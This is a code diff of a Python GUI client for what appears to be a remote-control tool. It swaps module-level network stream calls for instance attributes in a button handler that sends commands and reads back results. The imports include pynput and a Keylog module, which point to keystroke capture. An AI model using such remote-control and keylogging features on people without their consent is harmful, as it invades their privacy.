@@ -8,9 +8,6 @@ import pynput.keyboard
 import pynput.mouse
 from Process import Start, Kill, Process
 import Keylog
-from PyQt6.QtWidgets import QApplication, QWidget, QPushButton
-import Program
-
 img_bytes = b'\x00\x01\x02...'
 
 # Create the main GUI window
@@ -249,24 +246,24 @@ class GUI:
 
         def button1_click(self):
             s = "SEND"
-            Program.nw.write(s + "\n")
-            Program.nw.flush()
+            self.nw.write(s + "\n")
+            self.nw.flush()
             s = self.opApp.get()
-            Program.nw.write(s + "\n")
-            Program.nw.flush()
+            self.nw.write(s + "\n")
+            self.nw.flush()
             s = self.txtLink.get()
-            Program.nw.write(s + "\n")
-            Program.nw.flush()
+            self.nw.write(s + "\n")
+            self.nw.flush()
             s = self.txtNameValue.get()
-            Program.nw.write(s + "\n")
-            Program.nw.flush()
+            self.nw.write(s + "\n")
+            self.nw.flush()
             s = self.txtValue.get()
-            Program.nw.write(s + "\n")
-            Program.nw.flush()
+            self.nw.write(s + "\n")
+            self.nw.flush()
             s = self.opTypeValue.get()
-            Program.nw.write(s + "\n")
-            Program.nw.flush()
-            s = Program.nr.readline().strip()
+            self.nw.write(s + "\n")
+            self.nw.flush()
+            s = self.nr.readline().strip()
             self.txtKQ.insert(tk.END, s + "\n")
 
         def butXoa_click():
